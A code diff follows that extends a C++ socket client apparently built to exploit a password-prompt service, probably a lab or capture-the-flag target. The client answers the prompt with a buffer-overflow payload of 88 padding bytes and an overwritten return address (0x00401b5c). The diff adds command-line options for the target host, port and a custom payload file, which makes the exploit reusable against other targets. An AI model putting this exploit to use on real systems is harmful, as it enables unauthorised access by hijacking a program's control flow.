@@ -1,11 +1,41 @@
+#include <algorithm>
 #include <arpa/inet.h>
 #include <cstring>
+#include <fstream>
 #include <iostream>
+#include <memory>
+#include <string>
 #include <sys/socket.h>
 #include <unistd.h>
 
-int main() {
+int main(int argc, char *argv[]) {
     int port = 6248;
+    std::string ip_address = "127.0.0.1";
+    std::unique_ptr<char[]> payload(new char[88 + 8 + 1]);
+    int length = 88 + 8 + 1;
+    for (int i = 0; i < 88; i++) {
+        payload[i] = ' ';
+    }
+    *(reinterpret_cast<size_t *>(payload.get() + 88)) = 0x00401b5c;
+    payload[88 + 8] = '\n';
+    if (argc == 3) {
+        port = atoi(argv[1]);
+        ip_address = argv[2];
+    } else if (argc == 4) {
+        port = atoi(argv[1]);
+        ip_address = argv[2];
+        std::string filename_with_payload = argv[3];
+        std::string contents;
+        std::ifstream file(filename_with_payload);
+        std::getline(file, contents);
+        length = contents.size();
+        payload.reset(new char[length + 1]);
+        std::copy(contents.begin(), contents.end(), payload.get());
+    } else if (argc > 4) {
+        std::cerr << "Too many arguments" << std::endl;
+        return 1;
+    }
+
     sockaddr_in server;
     int socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
     if (socket_descriptor == -1) {
@@ -15,7 +45,7 @@ int main() {
     memset(&server, 0, sizeof(server));
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
-    if (inet_aton("127.0.0.1", &server.sin_addr) <= 0) {
+    if (inet_aton(ip_address.c_str(), &server.sin_addr) <= 0) {
         std::cerr << "Incorrect address" << std::endl;
         return 1;
     }
@@ -34,15 +64,8 @@ int main() {
         std::cout << "Server: " << buffer;
 
         if (strstr(buffer, "Please enter a password to continue:") != nullptr) {
-            char password[88 + 8 + 1];
-            for (int i = 0; i < 88; i++) {
-                password[i] = ' ';
-            }
-            *(reinterpret_cast<size_t *>(password + 88)) = 0x00401b5c;
-
-            password[88 + 8] = '\n';
-            send(socket_descriptor, password, sizeof(password), 0);
-            std::cout << "Sent password: " << password;
+            send(socket_descriptor, payload.get(), length, 0);
+            std::cout << "Sent password: " << payload.get() << std::endl;
         }
 
         if (strstr(buffer, "Success!") != nullptr ||
